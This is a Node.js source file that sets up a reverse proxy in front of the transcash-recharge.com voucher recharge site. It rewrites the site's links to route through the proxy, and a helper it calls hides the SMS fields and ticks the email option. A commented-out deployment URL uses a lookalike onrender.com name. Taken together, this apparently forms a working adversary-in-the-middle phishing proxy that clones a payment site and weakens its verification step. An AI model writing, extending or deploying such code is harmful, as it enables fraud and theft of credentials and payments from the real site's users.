const { createProxyMiddleware } = require('http-proxy-middleware');
const rewriteLinks = require('./rewriteLinks');
const desableSms = require('./desableSms');

// const PROXY_URL = 'https://transcash-recharge.onrender.com'; // Le proxy
const PROXY_URL = 'http://localhost:8080/'; // Le proxy
const TARGET_URL = 'https://www.transcash-recharge.com/'; // Le site cible

const proxy = createProxyMiddleware({
  target: TARGET_URL,
  changeOrigin: true,
  selfHandleResponse: true,
  
  on: {
    proxyReq: (proxyReq, req, res) => {
      console.log('📤 onProxyReq déclenché pour:', req.url);
      proxyReq.setHeader('accept-encoding', 'identity');
      
      // Désactiver le cache
      proxyReq.removeHeader('if-modified-since');
      proxyReq.removeHeader('if-none-match');
    },
    
    proxyRes: (proxyRes, req, res) => {
      console.log('📥 onProxyRes déclenché');
      console.log('Status original:', proxyRes.statusCode);
      
      const contentType = proxyRes.headers['content-type'] || '';
      
      // Gestion du 304
      if (proxyRes.statusCode === 304) {
        console.log('⚡ 304 Not Modified');
        Object.keys(proxyRes.headers).forEach(key => {
          res.setHeader(key, proxyRes.headers[key]);
        });
        res.statusCode = 304;
        res.end();
        return;
      }
      
      let body = [];
      
      proxyRes.on('data', (chunk) => {
        body.push(chunk);
      });
      
      proxyRes.on('end', () => {
        const buffer = Buffer.concat(body);
        let finalBody = buffer;
        
        // ✅ Modifier uniquement le HTML
        if (contentType.includes('text/html')) {
          const html = buffer.toString('utf8');
          
          // 🔧 RÉÉCRITURE DES LIENS
          let modifiedHtml = rewriteLinks(html, TARGET_URL, PROXY_URL);
          //cocher le email et masquer les champs sms
          modifiedHtml = desableSms(modifiedHtml);
          
          finalBody = Buffer.from(modifiedHtml, 'utf8');
          console.log('✅ HTML modifié avec liens réécris');
        }
        
        // Copier les headers
        Object.keys(proxyRes.headers).forEach(key => {
          if (key.toLowerCase() !== 'content-length') {
            res.setHeader(key, proxyRes.headers[key]);
          }
        });
        
        // Désactiver le cache
        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
        res.setHeader('Pragma', 'no-cache');
        res.setHeader('Expires', '0');
        
        res.statusCode = proxyRes.statusCode;
        res.setHeader('content-length', finalBody.length);
        
        console.log('✅ Réponse envoyée avec status', res.statusCode);
        res.end(finalBody);
      });
      
      proxyRes.on('error', (err) => {
        console.error('❌ Erreur proxyRes:', err);
        res.statusCode = 500;
        res.end('Proxy Error');
      });
    }
  }
});

module.exports = {PROXY_URL, TARGET_URL, proxy};